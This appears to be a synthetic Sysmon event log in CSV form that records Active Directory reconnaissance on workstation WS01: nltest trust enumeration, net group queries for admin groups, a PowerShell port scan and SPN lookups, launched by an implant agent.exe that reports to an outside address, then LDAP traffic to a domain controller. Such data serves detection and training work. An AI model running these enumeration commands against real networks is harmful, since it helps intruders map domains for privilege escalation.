SystemTime,EventID,Computer,User,RuleName,Image,CommandLine,ParentImage,ParentCommandLine,TargetImage,TargetFilename,TargetObject,Hashes,SourceIp,SourcePort,DestinationIp,DestinationPort,Protocol,Details,GrantedAccess
2024-03-15T08:05:00.112000Z,1,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\cmd.exe,"cmd.exe /c nltest /dclist:corp.local",C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe,agent.exe -c 185.220.101.47 -p 443,,,,,,,,,,,
2024-03-15T08:05:02.445000Z,1,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\nltest.exe,"/dclist:corp.local",C:\Windows\System32\cmd.exe,"cmd.exe /c nltest /dclist:corp.local",,,,,,,,,,,
2024-03-15T08:05:15.223000Z,1,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\nltest.exe,"/domain_trusts /all_trusts",C:\Windows\System32\cmd.exe,"cmd.exe /c nltest /domain_trusts /all_trusts",,,,,,,,,,,
2024-03-15T08:05:28.881000Z,1,WS01,CORP\jsmith,technique_id=T1018,C:\Windows\System32\net.exe,"net group \"Domain Controllers\" /domain",C:\Windows\System32\cmd.exe,"cmd.exe /c net group \"Domain Controllers\" /domain",,,,,,,,,,,
2024-03-15T08:05:45.334000Z,1,WS01,CORP\jsmith,technique_id=T1087,C:\Windows\System32\net.exe,"net user /domain",C:\Windows\System32\cmd.exe,"cmd.exe /c net user /domain",,,,,,,,,,,
2024-03-15T08:06:00.001000Z,1,WS01,CORP\jsmith,technique_id=T1087,C:\Windows\System32\net.exe,"net group \"Domain Admins\" /domain",C:\Windows\System32\cmd.exe,"cmd.exe /c net group \"Domain Admins\" /domain",,,,,,,,,,,
2024-03-15T08:06:05.772000Z,1,WS01,CORP\jsmith,technique_id=T1087,C:\Windows\System32\net.exe,"net group \"Enterprise Admins\" /domain",C:\Windows\System32\cmd.exe,"cmd.exe /c net group \"Enterprise Admins\" /domain",,,,,,,,,,,
2024-03-15T08:06:20.009000Z,1,WS01,CORP\jsmith,technique_id=T1069,C:\Windows\System32\net.exe,"net localgroup administrators",C:\Windows\System32\cmd.exe,"cmd.exe /c net localgroup administrators",,,,,,,,,,,
2024-03-15T08:06:35.441000Z,1,WS01,CORP\jsmith,technique_id=T1046,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -nop Invoke-PortScan -StartAddress 192.168.10.0 -EndAddress 192.168.10.254 -ResolveHost -ScanPort",C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe,agent.exe -c 185.220.101.47 -p 443,,,,,,,,,,,
2024-03-15T08:07:00.119000Z,1,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -nop -exec bypass Get-NetUser -SPN -Domain corp.local",C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe,agent.exe -c 185.220.101.47 -p 443,,,,,,,,,,,
2024-03-15T08:07:15.882000Z,1,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -nop Get-NetGroup -Domain corp.local -DomainController DC01.corp.local",C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe,agent.exe -c 185.220.101.47 -p 443,,,,,,,,,,,
2024-03-15T08:07:45.003000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50234,192.168.10.10,389,tcp,,
2024-03-15T08:07:45.112000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50235,192.168.10.10,389,tcp,,
2024-03-15T08:07:45.223000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50236,192.168.10.10,389,tcp,,
2024-03-15T08:07:45.334000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50237,192.168.10.10,389,tcp,,
2024-03-15T08:07:45.445000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50238,192.168.10.10,389,tcp,,
2024-03-15T08:07:45.556000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50239,192.168.10.10,389,tcp,,
2024-03-15T08:07:45.667000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50240,192.168.10.10,389,tcp,,
2024-03-15T08:07:45.778000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50241,192.168.10.10,389,tcp,,
2024-03-15T08:07:45.889000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50242,192.168.10.10,389,tcp,,
2024-03-15T08:07:46.001000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50243,192.168.10.10,389,tcp,,
2024-03-15T08:07:46.112000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50244,192.168.10.10,389,tcp,,
2024-03-15T08:07:46.223000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50245,192.168.10.10,389,tcp,,
2024-03-15T08:07:46.334000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50246,192.168.10.10,389,tcp,,
2024-03-15T08:07:46.445000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50247,192.168.10.10,389,tcp,,
2024-03-15T08:07:46.556000Z,3,WS01,CORP\jsmith,technique_id=T1482,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,192.168.10.101,50248,192.168.10.10,389,tcp,,
